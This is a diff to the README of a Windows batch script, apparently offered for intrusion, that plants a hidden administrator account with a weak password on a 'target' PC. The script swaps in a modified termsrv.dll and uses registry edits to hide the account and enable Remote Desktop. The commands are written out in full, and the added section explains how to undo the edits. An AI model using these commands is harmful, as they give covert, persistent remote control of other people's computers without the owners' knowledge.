@@ -9,7 +9,7 @@ This script create a hidden profil ( Administrator privilege ) and change regist
 
 <h2>Configuration:</h2>
 
-You need to open RDPScript.bat (in your pc)<br />
+You need to open RDPScript.bat with your editor (in your pc)<br />
 And make this changes :<br />
 <h4>net user hidden 123123 /ADD </h4>
 hidden = name of your created account<br />
@@ -17,6 +17,18 @@ hidden = name of your created account<br />
 <h4>xcopy "termsrv.dll" "%windir%\System32\" /s /h /q </h4>
 change termsrv.dll with your full path (in pc target) , ex : C:\Users\comix\Downloads\termsrv.dll <br />
 move termsrv.dll,RDPScript.bat in the pc target 
+
+<h2>Delete configuration</h2>
+Change this value in RDPScript.bat to delete the hidden profile from
+<h4>REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hidden /t REG_DWORD /d 0X00000000 /f</h4>
+To 
+<h4>REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hidden /t REG_DWORD /d 0X00000001 /f</h4>
+then you will be able to see your hidden profil
+And change this line 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000000 /f
+to
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000001 /f
+
 <h2>License</h2>
 
 Copyright © 2019 Soufiyan Ak (Comix)
